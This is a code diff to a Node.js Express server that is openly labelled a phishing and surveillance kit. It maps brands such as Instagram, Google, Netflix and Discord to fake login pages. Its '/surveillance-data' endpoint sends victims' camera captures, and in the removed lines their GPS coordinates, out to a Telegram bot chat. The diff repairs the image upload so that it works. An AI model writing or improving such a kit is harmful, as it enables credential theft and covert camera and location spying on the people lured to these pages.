@@ -2,20 +2,20 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 const path = require('path');
-const { Readable } = require('stream');
+const FormData = require('form-data'); // FormData handle karne ke liye
 
 const app = express();
 const BOT_TOKEN = process.env.BOT_TOKEN;
 
-app.use(bodyParser.json({ limit: '50mb' })); // Limit badha di taaki image data aa sake
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+app.use(bodyParser.json({ limit: '10mb' })); // Limit badha di taaki image data aa sake
+app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 
 // --- Phishing & Surveillance Pages Map ---
 const pageMap = {
     'Instagram': 'instagram.html', 'Facebook': 'facebook.html', 'Google': 'google.html',
     'Snapchat': 'snapchat.html', 'Amazon': 'amazon.html', 'Netflix': 'netflix.html',
     'Discord': 'discord.html', 'Gmail': 'google.html', 'InstaBlueTick': 'instabluetick.html',
-    'Camera': 'camera.html', 'Location': 'location.html', 'Microphone': 'microphone.html'
+    'Camera': 'camera.html'
 };
 
 const redirectMap = {
@@ -64,23 +64,19 @@ JOIN @TOXICBACK2025
 
 // --- Surveillance Data Catcher ---
 app.post('/surveillance-data', (req, res) => {
-    const { type, data, recipientId } = req.body;
+    const { type, recipientId, data } = req.body;
     if (!type || !data || !recipientId || !BOT_TOKEN) return res.sendStatus(400);
 
-    let message;
-    if (type === 'location') {
-        const { lat, lon, acc } = data;
-        message = `📍 **Location Hit!**\n- **Latitude:** \`${lat}\`\n- **Longitude:** \`${lon}\`\n- **Accuracy:** \`${acc}\` meters\n\n[Open Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})`;
-        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: recipientId, text: message, parse_mode: 'Markdown'
-        });
-    } else if (type === 'image') {
+    if (type === 'image') {
         const buffer = Buffer.from(data.split(',')[1], 'base64');
-        const formData = new FormData();
-        formData.append('chat_id', recipientId);
-        formData.append('photo', buffer, 'image.jpg');
-        formData.append('caption', '📸 **Camera Hit!**');
-        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData);
+        const form = new FormData();
+        form.append('chat_id', recipientId);
+        form.append('photo', buffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
+        form.append('caption', '📸 **Camera Hit!**');
+        
+        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
+            headers: form.getHeaders()
+        });
     }
     res.sendStatus(200);
 });
